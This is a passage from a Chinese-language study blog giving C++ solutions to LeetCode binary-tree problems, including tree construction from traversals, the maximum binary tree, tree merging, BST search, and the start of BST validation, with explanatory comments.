leftPostorderEnd)</span></span><br><span class="line">        <span class="keyword">int</span> leftPostorderBegin =  postorderBegin;</span><br><span class="line">        <span class="keyword">int</span> leftPostorderEnd = postorderBegin + delimiterIndex - inorderBegin; <span class="comment">// 终止位置是 需要加上 中序区间的大小size</span></span><br><span class="line">        <span class="comment">// 右后序区间，左闭右开[rightPostorderBegin, rightPostorderEnd)</span></span><br><span class="line">        <span class="keyword">int</span> rightPostorderBegin = postorderBegin + (delimiterIndex - inorderBegin);</span><br><span class="line">        <span class="keyword">int</span> rightPostorderEnd = postorderEnd - <span class="number">1</span>; <span class="comment">// 排除最后一个元素，已经作为节点了</span></span><br><span class="line"></span><br><span class="line">        root-&gt;left = <span class="built_in">traversal</span>(inorder, leftInorderBegin, leftInorderEnd,  postorder, leftPostorderBegin, leftPostorderEnd);</span><br><span class="line">        root-&gt;right = <span class="built_in">traversal</span>(inorder, rightInorderBegin, rightInorderEnd, postorder, rightPostorderBegin, rightPostorderEnd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">buildTree</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; inorder, vector&lt;<span class="keyword">int</span>&gt;&amp; postorder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (inorder.<span class="built_in">size</span>() == <span class="number">0</span> || postorder.<span class="built_in">size</span>() == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">// 左闭右开的原则</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">traversal</span>(inorder, <span class="number">0</span>, inorder.<span class="built_in">size</span>(), postorder, <span class="number">0</span>, postorder.<span class="built_in">size</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="105-从前序与中序遍历序列构造二叉树"><a href="#105-从前序与中序遍历序列构造二叉树" class="headerlink" title="105 从前序与中序遍历序列构造二叉树"></a>105 从前序与中序遍历序列构造二叉树</h2><p>给定两个整数数组 preorder 和 inorder ，其中 preorder 是二叉树的先序遍历， inorder 是同一棵树的中序遍历，请构造二叉树并返回其根节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">traversal</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; preorder,vector&lt;<span class="keyword">int</span>&gt;&amp; inorder)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preorder.<span class="built_in">size</span>()==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">int</span> rootValue = preorder[<span class="number">0</span>];<span class="comment">//确定树的 根节点：前序遍历的 第一个结点</span></span><br><span class="line">        TreeNode *root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(rootValue);<span class="comment">//新建一结点，根节点确定为rootValue</span></span><br><span class="line">        <span class="keyword">if</span>(preorder.<span class="built_in">size</span>()==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> root;<span class="comment">//当后序遍历数组中 只剩下一个结点时，直接返回 该结点</span></span><br><span class="line">        <span class="keyword">int</span> IN_index;</span><br><span class="line">        <span class="keyword">for</span>(IN_index=<span class="number">0</span>;IN_index&lt;inorder.<span class="built_in">size</span>();IN_index++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(inorder[IN_index]==rootValue)</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">//寻找中序数组中 节点值等于rootValue 的点 的 位置（下标）</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//切割中序数组</span></span><br><span class="line">        <span class="comment">//中序 左区间：左闭右开[0,In_index)</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">leftInorder</span><span class="params">(inorder.begin(),inorder.begin()+IN_index)</span></span>;</span><br><span class="line">        <span class="comment">//中序 右区间：左闭右开[In_index + 1 , inorder.size()) [In_index,end)</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">rightInorder</span><span class="params">(inorder.begin()+IN_index+<span class="number">1</span>,inorder.end())</span></span>;</span><br><span class="line">        <span class="comment">//去掉 中序数组中 首元素(与后序数组的不同之处)</span></span><br><span class="line">        <span class="built_in">reverse</span>(preorder.<span class="built_in">begin</span>(),preorder.<span class="built_in">end</span>());</span><br><span class="line">        preorder.<span class="built_in">resize</span>(preorder.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">reverse</span>(preorder.<span class="built_in">begin</span>(),preorder.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//切割前序数组</span></span><br><span class="line">        <span class="comment">//前序 左区间：左闭右开[0,In_index)</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">leftPreorder</span><span class="params">(preorder.begin(),preorder.begin()+IN_index)</span></span>;</span><br><span class="line">        <span class="comment">//前序 右区间：左闭右开[In_index,inorder.size()) [In_index,end)</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">rightPreorder</span><span class="params">(preorder.begin()+IN_index,preorder.end())</span></span>;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            后序切割中的 IN_index 可以改为 inorder.size()</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        root-&gt;left = <span class="built_in">traversal</span>(leftPreorder,leftInorder);</span><br><span class="line">        root-&gt;right = <span class="built_in">traversal</span>(rightPreorder,rightInorder);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">buildTree</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; preorder, vector&lt;<span class="keyword">int</span>&gt;&amp; inorder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preorder.<span class="built_in">size</span>()==<span class="number">0</span> || inorder.<span class="built_in">size</span>()==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">traversal</span>(preorder,inorder);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">        <span class="function">TreeNode* <span class="title">traversal</span> <span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; inorder, <span class="keyword">int</span> inorderBegin, <span class="keyword">int</span> inorderEnd, vector&lt;<span class="keyword">int</span>&gt;&amp; preorder, <span class="keyword">int</span> preorderBegin, <span class="keyword">int</span> preorderEnd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preorderBegin == preorderEnd) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> rootValue = preorder[preorderBegin]; <span class="comment">// 注意用preorderBegin 不要用0</span></span><br><span class="line">        TreeNode* root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(rootValue);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (preorderEnd - preorderBegin == <span class="number">1</span>) <span class="keyword">return</span> root;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> delimiterIndex;</span><br><span class="line">        <span class="keyword">for</span> (delimiterIndex = inorderBegin; delimiterIndex &lt; inorderEnd; delimiterIndex++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (inorder[delimiterIndex] == rootValue) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 切割中序数组</span></span><br><span class="line">        <span class="comment">// 中序左区间，左闭右开[leftInorderBegin, leftInorderEnd)</span></span><br><span class="line">        <span class="keyword">int</span> leftInorderBegin = inorderBegin;</span><br><span class="line">        <span class="keyword">int</span> leftInorderEnd = delimiterIndex;</span><br><span class="line">        <span class="comment">// 中序右区间，左闭右开[rightInorderBegin, rightInorderEnd)</span></span><br><span class="line">        <span class="keyword">int</span> rightInorderBegin = delimiterIndex + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> rightInorderEnd = inorderEnd;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 切割前序数组</span></span><br><span class="line">        <span class="comment">// 前序左区间，左闭右开[leftPreorderBegin, leftPreorderEnd)</span></span><br><span class="line">        <span class="keyword">int</span> leftPreorderBegin =  preorderBegin + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> leftPreorderEnd = preorderBegin + <span class="number">1</span> + delimiterIndex - inorderBegin; <span class="comment">// 终止位置是起始位置加上中序左区间的大小size</span></span><br><span class="line">        <span class="comment">// 前序右区间, 左闭右开[rightPreorderBegin, rightPreorderEnd)</span></span><br><span class="line">        <span class="keyword">int</span> rightPreorderBegin = preorderBegin + <span class="number">1</span> + (delimiterIndex - inorderBegin);</span><br><span class="line">        <span class="keyword">int</span> rightPreorderEnd = preorderEnd;</span><br><span class="line"></span><br><span class="line">        root-&gt;left = <span class="built_in">traversal</span>(inorder, leftInorderBegin, leftInorderEnd,  preorder, leftPreorderBegin, leftPreorderEnd);</span><br><span class="line">        root-&gt;right = <span class="built_in">traversal</span>(inorder, rightInorderBegin, rightInorderEnd, preorder, rightPreorderBegin, rightPreorderEnd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">buildTree</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; preorder, vector&lt;<span class="keyword">int</span>&gt;&amp; inorder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (inorder.<span class="built_in">size</span>() == <span class="number">0</span> || preorder.<span class="built_in">size</span>() == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 参数坚持左闭右开的原则</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">traversal</span>(inorder, <span class="number">0</span>, inorder.<span class="built_in">size</span>(), preorder, <span class="number">0</span>, preorder.<span class="built_in">size</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="654-最大二叉树——划分区间"><a href="#654-最大二叉树——划分区间" class="headerlink" title="654 最大二叉树——划分区间"></a>654 最大二叉树——划分区间</h3><p>给定一个不含重复元素的整数数组。一个以此数组构建的最大二叉树定义如下：</p><pre><code>二叉树的根是数组中的最大元素。左子树是通过数组中最大值左边部分构造出的最大二叉树。右子树是通过数组中最大值右边部分构造出的最大二叉树。</code></pre><p>通过给定的数组构建最大二叉树，并且输出这个树的根节点。<br><img src="https://img-blog.csdnimg.cn/9945c287508e4b36b00690e471950aaf.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">buide</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span></span>&#123;</span><br><span class="line">        TreeNode *root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">0</span>);<span class="comment">//构建根结点</span></span><br><span class="line">        <span class="keyword">if</span>(nums.<span class="built_in">size</span>()==<span class="number">1</span>)&#123;</span><br><span class="line">            root-&gt;val = nums[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//找最大值：获取最大值 和 其位置下标</span></span><br><span class="line">        <span class="keyword">int</span> max_val = INT_MIN;</span><br><span class="line">        <span class="keyword">int</span> max_index;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;nums.<span class="built_in">size</span>())&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &gt; max_val)&#123;</span><br><span class="line">                max_index = i;</span><br><span class="line">                max_val = nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">            i++;<span class="comment">//这个 while 循环条件总是忘记</span></span><br><span class="line">        &#125;</span><br><span class="line">        root-&gt;val = max_val;</span><br><span class="line">        <span class="comment">//为了保证 左区间至少有一个 结点</span></span><br><span class="line">        <span class="keyword">if</span>(max_index &gt; <span class="number">0</span>)&#123;<span class="comment">//划分左区间</span></span><br><span class="line">            <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">leftNums</span><span class="params">(nums.begin(),nums.begin()+max_index)</span></span>;</span><br><span class="line">            root-&gt;left = <span class="built_in">buide</span>(leftNums);<span class="comment">//递归构建</span></span><br><span class="line">        &#125;</span><br><span class="line">         <span class="comment">//为了保证 右区间至少有一个 结点</span></span><br><span class="line">        <span class="keyword">if</span>(max_index &lt; nums.<span class="built_in">size</span>()<span class="number">-1</span>)&#123;<span class="comment">//划分右区间</span></span><br><span class="line">            <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">rightNums</span><span class="params">(nums.begin()+max_index+<span class="number">1</span>,nums.end())</span></span>;</span><br><span class="line">            root-&gt;right = <span class="built_in">buide</span>(rightNums);<span class="comment">//递归构建</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">constructMaximumBinaryTree</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.<span class="built_in">size</span>()==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">buide</span>(nums);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="617-合并二叉树"><a href="#617-合并二叉树" class="headerlink" title="617 合并二叉树"></a>617 合并二叉树</h3><p>给你两棵二叉树： root1 和 root2 。<br>想象一下，当你将其中一棵覆盖到另一棵之上时，两棵树上的一些节点将会重叠（而另一些不会）。<br>【将这两棵树合并成一棵新二叉树】<br><strong>合并的规则</strong>：如果两个节点重叠，那么将这两个节点的值相加作为合并后节点的新值；否则，不为 null 的节点将直接作为新二叉树的节点。<br>返回合并后的二叉树。<br><img src="https://img-blog.csdnimg.cn/50bdefd6f86b42548cbb2d80974420f4.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment">    O(min(m,n))</span></span><br><span class="line"><span class="comment">    O(min(m,n))</span></span><br><span class="line"><span class="comment">    空间复杂度取决于递归调用的层数，递归调用的层数不会超过较小的二叉树的最大高度，最坏情况下，二叉树的高度等于节点数。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">buide</span><span class="params">(TreeNode* p1, TreeNode* p2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(p1 == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> p2;</span><br><span class="line">        <span class="keyword">if</span>(p2 == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> p1;</span><br><span class="line">        <span class="comment">//创建新结点</span></span><br><span class="line">        TreeNode *node = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(p1-&gt;val+p2-&gt;val);</span><br><span class="line">        node-&gt;left = <span class="built_in">buide</span>(p1-&gt;left,p2-&gt;left);    </span><br><span class="line">        node-&gt;right = <span class="built_in">buide</span>(p1-&gt;right,p2-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">mergeTrees</span><span class="params">(TreeNode* root1, TreeNode* root2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">buide</span>(root1,root2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    迭代-队列</span></span><br><span class="line"><span class="comment">    这里注意：如果想要新建一颗完整的树 而不是 在题目给的两个树上进行修改，就必须单独给 新的树 建个队列</span></span><br><span class="line"><span class="comment">    这里共有 【两个队列】</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">mergeTrees</span><span class="params">(TreeNode* root1, TreeNode* root2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root1==<span class="literal">nullptr</span>)  </span><br><span class="line">            <span class="keyword">return</span> root2;</span><br><span class="line">        <span class="keyword">if</span>(root2==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> root1;</span><br><span class="line">        queue&lt;TreeNode*&gt; q;<span class="comment">//存 原始两个树中的结点，用于依次遍历</span></span><br><span class="line">        queue&lt;TreeNode*&gt; q_node;<span class="comment">//存建好的结点</span></span><br><span class="line">        q.<span class="built_in">push</span>(root1);</span><br><span class="line">        q.<span class="built_in">push</span>(root2);</span><br><span class="line">        TreeNode *node = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(root1-&gt;val+root2-&gt;val);<span class="comment">//新建结点</span></span><br><span class="line">        q_node.<span class="built_in">push</span>(node);</span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            TreeNode *node1 = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            TreeNode *node2 = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            TreeNode *root = q_node.<span class="built_in">front</span>();</span><br><span class="line">            q_node.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="comment">//TreeNode *node = new TreeNode(node1-&gt;val+node2-&gt;val);</span></span><br><span class="line">            <span class="keyword">if</span>(node1-&gt;left &amp;&amp; node2-&gt;left)&#123;</span><br><span class="line">                TreeNode *node_left = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(node1-&gt;left-&gt;val+node2-&gt;left-&gt;val);</span><br><span class="line">                root-&gt;left = node_left;<span class="comment">//连接左结点</span></span><br><span class="line">                q.<span class="built_in">push</span>(node1-&gt;left);</span><br><span class="line">                q.<span class="built_in">push</span>(node2-&gt;left);</span><br><span class="line">                q_node.<span class="built_in">push</span>(node_left);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(node1-&gt;left &amp;&amp; !node2-&gt;left)&#123;</span><br><span class="line">                root-&gt;left = node1-&gt;left;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!node1-&gt;left &amp;&amp; node2-&gt;left)&#123;</span><br><span class="line">                root-&gt;left = node2-&gt;left;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(node1-&gt;right &amp;&amp; node2-&gt;right)&#123;</span><br><span class="line">                TreeNode *node_right = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(node1-&gt;right-&gt;val+node2-&gt;right-&gt;val);</span><br><span class="line">                root-&gt;right = node_right;<span class="comment">//连接右结点</span></span><br><span class="line">                q.<span class="built_in">push</span>(node1-&gt;right);</span><br><span class="line">                q.<span class="built_in">push</span>(node2-&gt;right);</span><br><span class="line">                q_node.<span class="built_in">push</span>(node_right);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(node1-&gt;right &amp;&amp; !node2-&gt;right)&#123;</span><br><span class="line">                root-&gt;right = node1-&gt;right;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!node1-&gt;right &amp;&amp; node2-&gt;right)&#123;</span><br><span class="line">                root-&gt;right = node2-&gt;right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="700-二叉搜索树中的搜索——典例"><a href="#700-二叉搜索树中的搜索——典例" class="headerlink" title="700 二叉搜索树中的搜索——典例"></a>700 二叉搜索树中的搜索——典例</h3><p>给定二叉搜索树（BST）的根节点和一个值。 你需要在BST中【找到节点值等于给定值的节点】。<br>返回以该节点为根的子树。 如果节点不存在，则返回 NULL。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">searchBST</span><span class="params">(TreeNode* root, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;val &gt; val)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">searchBST</span>(root-&gt;left, val);</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;val &lt; val)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">searchBST</span>(root-&gt;right, val);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    迭代</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">searchBST</span><span class="params">(TreeNode* root, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">while</span>(root &amp;&amp; root-&gt;val != val)&#123;<span class="comment">//这里是while</span></span><br><span class="line">            <span class="keyword">if</span>(root-&gt;val &gt; val)</span><br><span class="line">                root = root-&gt;left;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                root = root-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="98-验证二叉搜索树——典例"><a href="#98-验证二叉搜索树——典例" class="headerlink" title="98 验证二叉搜索树——典例"></a>98 验证二叉搜索树——典例</h3><p>给你一个二叉树的根节点 root ，判断其是否是一个有效的二叉搜索树。</p><p>有效 二叉搜索树定义如下：</p><pre><code>节点的左子树只包含 小于 当前节点的数。节点的右子树只包含 大于 当前节点的数。所有左子树和右子树自身必须也是二叉搜索树。</code></pre><p><strong>误区：</strong><br>认为对于每颗树以及其子树来说，只要满足左&lt;根&lt;右，即可。如下面的代码是错误的。对于该例子就不符合。<br><img src="https://img-blog.csdnimg.cn/c041f29f9fa04b80955660b8dc59b115.png"><br>对于5这个结点来说，右边存在结点3，是错误的<br>但是代码只会判断 